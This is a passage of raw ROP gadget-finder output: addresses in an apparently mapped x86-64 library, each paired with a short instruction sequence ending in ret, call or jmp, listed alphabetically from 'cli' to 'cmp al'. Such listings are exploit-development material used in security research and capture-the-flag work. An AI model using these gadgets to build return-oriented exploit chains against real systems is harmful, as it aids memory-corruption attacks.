0x00002aaaaab97d6a : cli ; add cl, byte ptr [rax + 0x29] ; ret 0x8948
0x00002aaaaab11963 : cli ; add cl, byte ptr [rax + 0x29] ; ret 0x8949
0x00002aaaaab1198c : cli ; add cl, byte ptr [rax + 0x29] ; ret 0x8d48
0x00002aaaaab49078 : cli ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x00002aaaaabf8b2e : cli ; add cl, byte ptr [rbp + 0xf] ; ret
0x00002aaaaab7edb2 : cli ; add cl, byte ptr [rdi] ; xchg eax, esp ; ret 0x8444
0x00002aaaaac46e81 : cli ; add dh, byte ptr [rdx + 0xb] ; mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x00002aaaaab7ea4e : cli ; add dh, byte ptr [rdx + 8] ; mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x00002aaaaaafb485 : cli ; add dword ptr [rax + 0x19], ecx ; ror byte ptr [rax - 0x7d], cl ; ret 0x4906
0x00002aaaaabda148 : cli ; add dword ptr [rbp - 0xc], esi ; add rsp, 0x78 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0ef4b : cli ; add dword ptr [rcx + rdx*2 + 0x48], esi ; add esp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaabab604 : cli ; add dword ptr [rcx], ebx ; rol byte ptr [rbx - 0x3f7cfd20], 8 ; ret
0x00002aaaaab7ea5b : cli ; add dword ptr [rdx + 2], esi ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab7400c : cli ; add dword ptr [rdx + 4], esi ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab96cf9 : cli ; add eax, 0x2941c229 ; ret 0x6b45
0x00002aaaaab8ff0a : cli ; add ebp, dword ptr [rcx] ; ret 0x48d
0x00002aaaaaad8791 : cli ; add ebx, ebp ; in al, -0x12 ; jne 0x3779 ; ret 0x975
0x00002aaaaac445d2 : cli ; add r8b, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaabd3730 : cli ; and byte ptr [rsp + rbp*8 + 0x41], dh ; mov byte ptr [rax - 1], 0 ; ret
0x00002aaaaabd3dd1 : cli ; and ecx, dword ptr [rdi] ; xchg eax, ebp ; ret 0xc084
0x00002aaaaac7af2a : cli ; call qword ptr [rax]
0x00002aaaaac7c172 : cli ; call qword ptr [rdi]
0x00002aaaaab5c55a : cli ; call rax
0x00002aaaaabb9433 : cli ; call rcx
0x00002aaaaac6f3e2 : cli ; call rsp
0x00002aaaaabca9d5 : cli ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaab0fa01 : cli ; dec dword ptr [rax + 0xf] ; ret
0x00002aaaaabc570d : cli ; dec dword ptr [rax - 0x7f] ; in al, dx ; add byte ptr [rax + rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac6f5fa : cli ; dec dword ptr [rbx + rdi + 0x3e840002] ; cli ; jmp rsp
0x00002aaaaac6f852 : cli ; dec dword ptr [rcx + rcx*2 + 0x66340002] ; cli ; call rsp
0x00002aaaaabb828c : cli ; dec dword ptr [rcx - 0x77] ; ret 0x448b
0x00002aaaaac12418 : cli ; dec dword ptr [rdi] ; test byte ptr [rax], ah ; add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaac6f552 : cli ; dec esp ; add al, byte ptr ss:[rax] ; adc al, 0x29 ; cli ; jmp rsp
0x00002aaaaac6f74a : cli ; dec esp ; add r8b, byte ptr [rax] ; hlt ; push rdi ; cli ; jmp rsp
0x00002aaaaac6fada : cli ; dec esp ; pop rcx ; add al, byte ptr [rax] ; test cl, cl ; cli ; jmp rsp
0x00002aaaaac6f59a : cli ; inc dword ptr [rax + rdi + 0x2ef40002] ; cli ; jmp rsp
0x00002aaaaac6f3da : cli ; inc dword ptr [rsp + rbp + 0x3440002] ; cli ; call rsp
0x00002aaaaab47289 : cli ; jbe 0x72201 ; mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaac21f2b : cli ; jg 0x14cf3e ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm7 ; ret
0x00002aaaaac2241b : cli ; jg 0x14d42e ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm7 ; ret
0x00002aaaaac227bb : cli ; jg 0x14d7ce ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm7 ; ret
0x00002aaaaac46e51 : cli ; jg 0x171e63 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00002aaaaab73fc7 : cli ; jg 0x9efda ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x00002aaaaab7471a : cli ; jg 0x9f72d ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x00002aaaaab74e67 : cli ; jg 0x9fe7a ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x00002aaaaab7ea26 : cli ; jg 0xa9a38 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00002aaaaac60586 : cli ; jmp qword ptr [rax - 0x4700059e]
0x00002aaaaac73df2 : cli ; jmp qword ptr [rcx]
0x00002aaaaac6fa52 : cli ; jmp qword ptr [rdi + rdx*2 + 2]
0x00002aaaaac6fa5a : cli ; jmp qword ptr [rdi + rdx*2 - 0x3cdbfffe]
0x00002aaaaac7c15a : cli ; jmp qword ptr [rdi]
0x00002aaaaac5f4ba : cli ; jmp rax
0x00002aaaaac6f47a : cli ; jmp rsp
0x00002aaaaac6f6da : cli ; lcall ptr [rdx + rax*2 + 0x53440002] ; cli ; call rsp
0x00002aaaaac6fa3a : cli ; lcall ptr [rsi + rdx*2 - 0x40abfffe] ; cli ; jmp rsp
0x00002aaaaac6f70a : cli ; ljmp ptr [rbx + rax*2 + 0x56240002] ; cli ; jmp rsp
0x00002aaaaac6f8a2 : cli ; ljmp ptr [rsp + rcx*2 + 2] ; add ah, dl ; jg 0x19a8ae ; call rsp
0x00002aaaaac279a8 : cli ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab0f631 : cli ; mov eax, edi ; sar edx, 0x1f ; xor eax, edx ; sub eax, edx ; ret
0x00002aaaaac10942 : cli ; mov ebp, 0x8b48ffff ; cmp byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac279a2 : cli ; mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab72d37 : cli ; mov rax, rdi ; ret
0x00002aaaaab38b65 : cli ; mov rsi, qword ptr [rip + 0x35f403] ; call rax
0x00002aaaaabf1300 : cli ; mov rsi, r14 ; mov rdi, r13 ; call rax
0x00002aaaaab63138 : cli ; movzx edx, dl ; sub eax, edx ; ret
0x00002aaaaac1a366 : cli ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab8f716 : cli ; or cl, byte ptr [rax + 0x29] ; ret 0x8941
0x00002aaaaab5a7d9 : cli ; or cl, byte ptr [rdi] ; xchg dword ptr [rcx + rax - 0x7cb70000], ebx ; ret 0xe96e
0x00002aaaaab12322 : cli ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaabd5f39 : cli ; or dword ptr [rdi], ecx ; xchg edi, ebp ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabd64b9 : cli ; or dword ptr [rdi], ecx ; xchg edi, esp ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac59c81 : cli ; push 0x6e ; ja 0x184c0e ; ret 0x48f
0x00002aaaaac5f4b6 : cli ; push qword ptr [rax - 0x1f0005d8] ; sub dl, bh ; call rax
0x00002aaaaac6f472 : cli ; push qword ptr [rcx + rsi + 2] ; add byte ptr [rcx + rbx - 6], dh ; jmp rsp
0x00002aaaaac6a950 : cli ; pushfq ; cld ; jmp qword ptr [rax + 0x20fffca4]
0x00002aaaaab01b2f : cli ; ret
0x00002aaaaab909dc : cli ; ret 0x10
0x00002aaaaabd1442 : cli ; ret 0x2c
0x00002aaaaac58725 : cli ; ret 0xac65
0x00002aaaaaba937e : cli ; sbb cl, al ; clc ; sbb byte ptr [rcx], bh ; ret 0x850f
0x00002aaaaabe8ebb : cli ; setae al ; ret
0x00002aaaaac69949 : cli ; sti ; inc dword ptr [rax] ; cld ; sti ; inc dword ptr [rax - 0x19] ; sti ; call qword ptr [rax]
0x00002aaaaabe9432 : cli ; sub eax, dword ptr [rax] ; test eax, eax ; jne 0x11444a ; xor eax, eax ; ret
0x00002aaaaabe9132 : cli ; sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x11414a ; xor eax, eax ; ret
0x00002aaaaab5fc49 : cli ; test rdx, rdx ; je 0x8ac69 ; bsf rax, rdx ; ret
0x00002aaaaab5fc49 : cli ; test rdx, rdx ; je 0x8ac6a ; bsf rax, rdx ; ret
0x00002aaaaab5fe18 : cli ; test rdx, rdx ; je 0x8ae49 ; bsf rax, rdx ; ret
0x00002aaaaab5fe18 : cli ; test rdx, rdx ; je 0x8ae4a ; bsf rax, rdx ; ret
0x00002aaaaac5736a : cli ; xchg dword ptr [rsp + rax + 0x6fa9ce9d], esp ; ret
0x00002aaaaab95d4e : cmc ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab880f9 : cmc ; add al, byte ptr [rax] ; add byte ptr [rbp - 0x276b213], al ; setne dl ; jmp 0xb3123
0x00002aaaaac90886 : cmc ; add al, byte ptr [rax] ; ret
0x00002aaaaac908a6 : cmc ; add al, byte ptr [rax] ; ret 0x503
0x00002aaaaac1e8d8 : cmc ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac7f49d : cmc ; add byte ptr [rax], al ; add byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac7f485 : cmc ; add byte ptr [rax], al ; call 0x221a96b6
0x00002aaaaac7f484 : cmc ; add byte ptr [rax], al ; call 0x221a96b7
0x00002aaaaab800e7 : cmc ; add byte ptr [rax], al ; ret
0x00002aaaaac7f515 : cmc ; add byte ptr [rax], al ; sbb byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac7f52d : cmc ; add byte ptr [rax], al ; xor byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaab0001c : cmc ; add byte ptr [rdx - 0x75], cl ; add al, 0xf0 ; test rax, rax ; je 0x2b034 ; call rax
0x00002aaaaac6ed05 : cmc ; add dword ptr [rax], eax ; xor al, 0xdb ; clc ; call rsp
0x00002aaaaac4955a : cmc ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab80381 : cmc ; and ch, 0xf ; je 0xab3aa ; add rax, 2 ; ret
0x00002aaaaac5df1e : cmc ; call qword ptr [rax]
0x00002aaaaac5e206 : cmc ; call qword ptr [rbx]
0x00002aaaaac5de72 : cmc ; call qword ptr [rcx]
0x00002aaaaac5e1fa : cmc ; call qword ptr [rdi]
0x00002aaaaac83c6a : cmc ; call qword ptr [rdx]
0x00002aaaaac8515a : cmc ; call qword ptr [rsi]
0x00002aaaaac5dde2 : cmc ; call rax
0x00002aaaaac85de2 : cmc ; call rdi
0x00002aaaaac5e422 : cmc ; call rdx
0x00002aaaaac5e2da : cmc ; call rsi
0x00002aaaaac5e032 : cmc ; call rsp
0x00002aaaaaba5a64 : cmc ; cmp dl, 0x3f ; jne 0xd0a37 ; mov eax, 1 ; ret
0x00002aaaaabc86b1 : cmc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaab9da01 : cmc ; dec dword ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaac5df1a : cmc ; dec dword ptr [rbp + 6] ; cmc ; call qword ptr [rax]
0x00002aaaaac5df16 : cmc ; dec dword ptr [rbp + 6] ; cmc ; dec dword ptr [rbp + 6] ; cmc ; call qword ptr [rax]
0x00002aaaaac5e046 : cmc ; dec dword ptr [rsi] ; cmc ; push rsp ; cmc ; call rsp
0x00002aaaaac6d32a : cmc ; dec dword ptr [rsp + 0x21040001] ; cmc ; jmp rsp
0x00002aaaaac6d3d2 : cmc ; dec esp ; add dword ptr [eax], eax ; test byte ptr [rdx - 0xb], al ; jmp rsp
0x00002aaaaac5e3fe : cmc ; inc eax ; mov dr0, ebp ; call rsi
0x00002aaaaabf7412 : cmc ; je 0x12240c ; pop rbx ; ret
0x00002aaaaac5e412 : cmc ; jmp qword ptr [rbx]
0x00002aaaaac5e40a : cmc ; jmp qword ptr [rcx]
0x00002aaaaac83e52 : cmc ; jmp qword ptr [rdx]
0x00002aaaaac5ddee : cmc ; jmp rax
0x00002aaaaac85762 : cmc ; jmp rdi
0x00002aaaaac6d332 : cmc ; jmp rsp
0x00002aaaaabd6406 : cmc ; lcall ptr [rax + 0x48] ; mov eax, ebx ; pop rdx ; pop rbx ; ret
0x00002aaaaac5ddda : cmc ; lcall ptr [rax] ; add eax, 0x518fff5 ; cmc ; call rax
0x00002aaaaac5dde6 : cmc ; lcall ptr [rax] ; add eax, 0x518fff5 ; cmc ; jmp rax
0x00002aaaaac5de5e : cmc ; lcall ptr [rax] ; add eax, 0x580fff5 ; cmc ; call rax
0x00002aaaaac6d402 : cmc ; ljmp ptr [rax + rbp*2 + 0x44940001] ; cmc ; jmp rsp
0x00002aaaaac5a0a9 : cmc ; mov ch, 0xab ; ret
0x00002aaaaac2f19a : cmc ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2722e : cmc ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f193 : cmc ; mov ecx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 0xb], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac273b3 : cmc ; mov edx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac46243 : cmc ; movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x00002aaaaab43291 : cmc ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac56f57 : cmc ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x00002aaaaab4d18d : cmc ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6d2d2 : cmc ; push qword ptr [rcx + 0x14940001] ; cmc ; call rsp
0x00002aaaaac5e2ea : cmc ; push rbx ; cmc ; call qword ptr [rbx]
0x00002aaaaac5d780 : cmc ; push rdx ; hlt ; push qword ptr [rsi] ; push rdx ; hlt ; inc dword ptr [rax + 0x52] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5e04a : cmc ; push rsp ; cmc ; call rsp
0x00002aaaaac5d744 : cmc ; push rsp ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab9d353 : cmc ; ret
0x00002aaaaac69939 : cmc ; sti ; inc eax ; idiv bl ; call qword ptr [rax]
0x00002aaaaac590d9 : cmc ; sub dword ptr [rdi], ecx ; push rbx ; xchg eax, edx ; jae 0x1840be ; push rsi ; pop rdx ; je 0x1840b3 ; ret 0xacfc
0x00002aaaaac46247 : cmc ; sub eax, edx ; ret
0x00002aaaaac596e5 : cmc ; xlatb ; ret 0x4e27
0x00002aaaaabe9d86 : cmova eax, edx ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabbee01 : cmova eax, edx ; ret
0x00002aaaaab90b11 : cmova esi, edx ; imul esi, esi, 0x3c ; add eax, esi ; ret
0x00002aaaaab520b9 : cmovae eax, dword ptr [rdi + 0x10] ; sub rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab5f8a7 : cmovae eax, ecx ; ret
0x00002aaaaab1f5c1 : cmovae eax, edi ; ret
0x00002aaaaabdcecc : cmovae eax, esi ; ret
0x00002aaaaaad88a7 : cmovae ebp, dword ptr [rdi - 0x26] ; int 3
0x00002aaaaab520b8 : cmovae rax, qword ptr [rdi + 0x10] ; sub rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab1f5c0 : cmovae rax, rdi ; ret
0x00002aaaaabdcecb : cmovae rax, rsi ; ret
0x00002aaaaab0fc7f : cmovbe edx, eax ; xor eax, eax ; mov qword ptr [rdi + 8], rdx ; ret
0x00002aaaaab0fc7e : cmovbe rdx, r8 ; xor eax, eax ; mov qword ptr [rdi + 8], rdx ; ret
0x00002aaaaab7192d : cmove eax, dword ptr [rbp - 0x60] ; jmp 0x9c863
0x00002aaaaabc1272 : cmove eax, dword ptr [rbp - 0x88] ; mov rdi, rax ; call rbx
0x00002aaaaab402e4 : cmove eax, dword ptr [rsp + 0xc] ; add rsp, 0x18 ; ret
0x00002aaaaabcad5b : cmove eax, dword ptr [rsp] ; add rsp, 0x18 ; ret
0x00002aaaaab6bdb9 : cmove eax, ebx ; pop rbx ; ret
0x00002aaaaab49f51 : cmove eax, ecx ; ret
0x00002aaaaac1071a : cmove eax, ecx ; sub rsp, -0x80 ; pop rbx ; ret
0x00002aaaaab63c78 : cmove eax, edx ; add eax, 1 ; ret
0x00002aaaaab90852 : cmove eax, edx ; add rsp, 0x28 ; ret
0x00002aaaaabcbb40 : cmove eax, edx ; add rsp, 0x60 ; pop rbx ; ret
0x00002aaaaab5bd23 : cmove eax, edx ; add rsp, 8 ; ret
0x00002aaaaabe9ef4 : cmove eax, edx ; mov qword ptr [rip + 0x2b2222], rax ; pop rbp ; ret
0x00002aaaaab0290b : cmove eax, edx ; ret
0x00002aaaaabab061 : cmove eax, esi ; ret
0x00002aaaaab72e01 : cmove ecx, dword ptr [rcx - 0x76b7fbb9] ; clc ; ret
0x00002aaaaabe8eb4 : cmove edx, eax ; xor eax, eax ; cmp rdx, rdi ; setae al ; ret
0x00002aaaaabda23b : cmove edx, ecx ; mov rax, rbx ; mov byte ptr [rdx], 0 ; pop rbx ; ret
0x00002aaaaab8e6e8 : cmove esi, ecx ; call 0x8e809
0x00002aaaaab31469 : cmove esi, ecx ; jmp 0x5c434
0x00002aaaaab49f50 : cmove r8, rcx ; ret
0x00002aaaaab7192c : cmove rax, qword ptr [rbp - 0x60] ; jmp 0x9c864
0x00002aaaaabc1271 : cmove rax, qword ptr [rbp - 0x88] ; mov rdi, rax ; call rbx
0x00002aaaaabcad5a : cmove rax, qword ptr [rsp] ; add rsp, 0x18 ; ret
0x00002aaaaab6bdb8 : cmove rax, rbx ; pop rbx ; ret
0x00002aaaaab80c74 : cmove rax, rcx ; ret
0x00002aaaaac10719 : cmove rax, rcx ; sub rsp, -0x80 ; pop rbx ; ret
0x00002aaaaab63c89 : cmove rax, rdx ; add eax, 1 ; ret
0x00002aaaaab90851 : cmove rax, rdx ; add rsp, 0x28 ; ret
0x00002aaaaab5bd22 : cmove rax, rdx ; add rsp, 8 ; ret
0x00002aaaaab0290a : cmove rax, rdx ; ret
0x00002aaaaabda23a : cmove rdx, rcx ; mov rax, rbx ; mov byte ptr [rdx], 0 ; pop rbx ; ret
0x00002aaaaab31468 : cmove rsi, r9 ; jmp 0x5c435
0x00002aaaaab8e6e7 : cmove rsi, rcx ; call 0x8e80a
0x00002aaaaab46bfb : cmovg eax, ecx ; test rdx, rdx ; jne 0x71bf9 ; ret
0x00002aaaaab4ff3b : cmovg eax, ecx ; test rdx, rdx ; jne 0x7af39 ; ret
0x00002aaaaab46bfa : cmovg rax, rcx ; test rdx, rdx ; jne 0x71bfa ; ret
0x00002aaaaab4ff3a : cmovg rax, rcx ; test rdx, rdx ; jne 0x7af3a ; ret
0x00002aaaaab9f254 : cmovle eax, ebx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4e943 : cmovne eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0fa04 : cmovne eax, ebx ; pop rbx ; ret
0x00002aaaaabe5011 : cmovne eax, ecx ; ret
0x00002aaaaab6b8db : cmovne eax, edi ; ret
0x00002aaaaac14c66 : cmovne eax, edx ; add rsp, 8 ; ret
0x00002aaaaab46cc1 : cmovne eax, edx ; mov dword ptr [rbx + 0x74], eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaab50529 : cmovne eax, edx ; mov dword ptr [rbx], eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaab5df53 : cmovne eax, edx ; ret
0x00002aaaaabe4fa4 : cmovne eax, esi ; ret
0x00002aaaaabd0e86 : cmovne ebx, eax ; add rsp, 0x60 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabd51c7 : cmovne ebx, eax ; call 0xfc3e5
0x00002aaaaab61a35 : cmovne esi, edx ; bsr rsi, rsi ; lea rax, qword ptr [rcx + rsi] ; ret
0x00002aaaaab0fa03 : cmovne rax, rbx ; pop rbx ; ret
0x00002aaaaab6b8da : cmovne rax, rdi ; ret
0x00002aaaaac14c65 : cmovne rax, rdx ; add rsp, 8 ; ret
0x00002aaaaab5df52 : cmovne rax, rdx ; ret
0x00002aaaaabd51c6 : cmovne rbx, rax ; call 0xfc3e6
0x00002aaaaabe3122 : cmovns eax, dword ptr [rbx + 0x28] ; pop rbx ; ret
0x00002aaaaabd1838 : cmovns edx, dword ptr [rsp] ; add rsp, 0x18 ; mov eax, edx ; ret
0x00002aaaaabe3121 : cmovns rax, qword ptr [rbx + 0x28] ; pop rbx ; ret
0x00002aaaaabfce60 : cmovs eax, dword ptr [rbx + 0x5d5b80ec] ; pop r12 ; ret
0x00002aaaaabaa902 : cmovs eax, dword ptr [rbx + 0xc8902c0] ; mov cl, byte ptr [rax + 0x39] ; ret
0x00002aaaaab23d5b : cmovs eax, dword ptr [rbx - 0x76b60f20] ; ret
0x00002aaaaab2e434 : cmovs eax, dword ptr [rbx - 0x76b60f20] ; ret 0x8b48
0x00002aaaaab72d73 : cmovs eax, dword ptr [rbx - 0x76b7fd39] ; clc ; ret
0x00002aaaaab0f6f6 : cmovs eax, edx ; pop rbx ; ret
0x00002aaaaaaf8b8c : cmovs eax, edx ; ret
0x00002aaaaab6f4d4 : cmovs ebp, dword ptr [rcx] ; ret
0x00002aaaaab54b81 : cmovs ebp, dword ptr [rcx] ; ret 0x14c
0x00002aaaaab7c265 : cmovs ecx, dword ptr [rbp - 0x7af0f081] ; and byte ptr [rax], cl ; add byte ptr [rax], al ; ret
0x00002aaaaab7ab91 : cmovs ecx, dword ptr [rbp - 0x7af0f081] ; in al, 6 ; add byte ptr [rax], al ; ret
0x00002aaaaabc527e : cmovs ecx, dword ptr [rbx + 0x148d4800] ; cmp ecx, dword ptr [rax + 0x39] ; ret 0x860f
0x00002aaaaab7e179 : cmovs ecx, dword ptr [rcx - 0x12cff8a9] ; mov byte ptr [rdi + 0xf], ch ; ret
0x00002aaaaab7e159 : cmovs ecx, dword ptr [rcx - 0x12cff9a9] ; mov byte ptr [rdi + 0xe], ch ; ret
0x00002aaaaab7e139 : cmovs ecx, dword ptr [rcx - 0x12cffaa9] ; mov byte ptr [rdi + 0xd], ch ; ret
0x00002aaaaac03e58 : cmovs ecx, dword ptr [rcx] ; ret 0x8948
0x00002aaaaab6e043 : cmovs edi, dword ptr [rcx] ; fmul dword ptr [rax + 0xf] ; ret
0x00002aaaaab7f0a6 : cmovs esp, dword ptr [rbx + 0x34] ; nop ; add rax, rsi ; jmp rax
0x00002aaaaab31466 : cmp ah, 0x49 ; cmove esi, ecx ; jmp 0x5c437
0x00002aaaaac69fdd : cmp ah, bh ; jmp qword ptr [rax + 0x20fffc39]
0x00002aaaaac6a01d : cmp ah, bh ; jmp qword ptr [rax]
0x00002aaaaac1ebd3 : cmp ah, byte ptr [rbx - 0x25] ; cmp ch, byte ptr [rcx] ; ret 0xd089
0x00002aaaaac1ea48 : cmp ah, byte ptr [rbx - 0x35] ; add cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xf40
0x00002aaaaac1eaaf : cmp ah, byte ptr [rbx - 0x37] ; cmp ch, byte ptr [rcx] ; ret 0xd089
0x00002aaaaac83398 : cmp ah, ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac83848 : cmp al, 0 ; add byte ptr [rax], al ; adc al, 0x39 ; add dword ptr [rax], eax ; adc bh, bh ; hlt ; call rsi
0x00002aaaaac82e70 : cmp al, 0 ; add byte ptr [rax], al ; cmp al, 0x2f ; add dword ptr [rax], eax ; mov bh, bl ; hlt ; call qword ptr [rbx]
0x00002aaaaac789a0 : cmp al, 0 ; add byte ptr [rax], al ; insb byte ptr [rdi], dx ; mov al, byte ptr [rax] ; add byte ptr [rax + 0x7d], ch ; in eax, dx ; call qword ptr [rsi]
0x00002aaaaac713c0 : cmp al, 0 ; add byte ptr [rax], al ; mov word ptr [rax + rax], ss ; add byte ptr [rax + 0x6f], ch ; std ; call qword ptr [rcx]
0x00002aaaaac7edd8 : cmp al, 0 ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; out dx, al ; add byte ptr [rax], al ; xor byte ptr [rdx], cl ; call rsi
0x00002aaaaac8d990 : cmp al, 0 ; add byte ptr [rax], al ; pop rsp ; fiadd dword ptr [rcx] ; add byte ptr [rax], bh ; fdivrp st(7) ; jmp rdi
0x00002aaaaab6b0c1 : cmp al, 0x24 ; add byte ptr [rdx + rcx + 0x5b], dh ; pop rbp ; pop r12 ; ret
0x00002aaaaabd71a1 : cmp al, 0x24 ; call rbx
0x00002aaaaac1792c : cmp al, 0x24 ; mov rax, qword ptr [rax + 0x128] ; jmp rax
0x00002aaaaabfd4a5 : cmp al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x00002aaaaabcd330 : cmp al, 0x28 ; stc ; dec dword ptr [rbp + rcx*4 + 0x24] ; sub byte ptr [rax - 0x77], cl ; ret 0x8d49
0x00002aaaaac82e74 : cmp al, 0x2f ; add dword ptr [rax], eax ; mov bh, bl ; hlt ; call qword ptr [rbx]
0x00002aaaaab0dfed : cmp al, 0x33 ; call rax
0x00002aaaaab6b7a5 : cmp al, 0x3d ; jne 0x967df ; mov rax, rdi ; pop rbx ; ret
0x00002aaaaaba5b2c : cmp al, 0x3f ; jne 0xd0af1 ; mov eax, 1 ; ret
0x00002aaaaaba5b44 : cmp al, 0x3f ; jne 0xd0b0e ; mov eax, 1 ; ret
0x00002aaaaac58360 : cmp al, 0x46 ; clc ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00002aaaaac84974 : cmp al, 0x4a ; add dword ptr [rax], eax ; fcomp dword ptr [rdx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac84f74 : cmp al, 0x50 ; add dword ptr [rax], eax ; mov byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac69e10 : cmp al, 0x51 ; cld ; jmp rdx
0x00002aaaaac69e08 : cmp al, 0x52 ; cld ; ljmp ptr [rcx + rdx*2 + 0x513cfffc] ; cld ; jmp rdx
0x00002aaaaac87074 : cmp al, 0x71 ; add dword ptr [rax], eax ; pop rax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaab5ff60 : cmp al, 0x71 ; add dword ptr [rax], eax ; ret
0x00002aaaaababb9f : cmp al, 0x81 ; dec dword ptr [rdi] ; test dword ptr [rsi], edx ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb04
0x00002aaaaabadfae : cmp al, 0x8e ; dec dword ptr [rdi] ; test byte ptr [rcx - 0x7cfffffb], bh ; ret 0x3902
0x00002aaaaabb5e9a : cmp al, 0xbb ; add rdi, r11 ; jmp rdi
0x00002aaaaac6e524 : cmp al, 0xc3 ; add dword ptr [rax], eax ; xor al, 0xe5 ; idiv edi ; push rsp ; ret
0x00002aaaaac7d074 : cmp al, 0xd1 ; add byte ptr [rax], al ; fdiv st(0) ; call qword ptr [rax]
0x00002aaaaac5d454 : cmp al, 0xdc ; ljmp ptr [rdx] ; fdivr st(3), st(0) ; jmp qword ptr [rdi]
0x00002aaaaab6dfc0 : cmp al, 0xf ; mov dh, 0x45 ; ret 0x8349
0x00002aaaaac7c439 : cmp al, 0xf0 ; jmp qword ptr [rbx]
0x00002aaaaac87911 : cmp al, 0xf6 ; call qword ptr [rax]
0x00002aaaaac6f5f9 : cmp al, 0xfa ; dec dword ptr [rbx + rdi + 0x3e840002] ; cli ; jmp rsp
0x00002aaaaac69980 : cmp al, 0xfb ; call rax
0x00002aaaaac692d5 : cmp al, 0xfb ; inc dword ptr [rax] ; sti ; call rax
0x00002aaaaac6c44c : cmp al, 0xfc ; add byte ptr [rax], al ; push rsp ; xor ch, bh ; call rsp
0x00002aaaaac69fe9 : cmp al, 0xfc ; jmp qword ptr [rax]
0x00002aaaaab827c6 : cmp al, 1 ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabab718 : cmp al, 1 ; jne 0xd671b ; xor eax, eax ; cmp cl, byte ptr [rsi] ; je 0xd66c1 ; pop rbx ; ret
0x00002aaaaac44a43 : cmp al, 2 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac25976 : cmp al, 4 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7ad40 : cmp al, 5 ; add byte ptr [rax], al ; ret
0x00002aaaaab463fb : cmp al, byte ptr [rax + 0xf] ; mov dh, 0xc7 ; ret
0x00002aaaaac25b64 : cmp al, byte ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
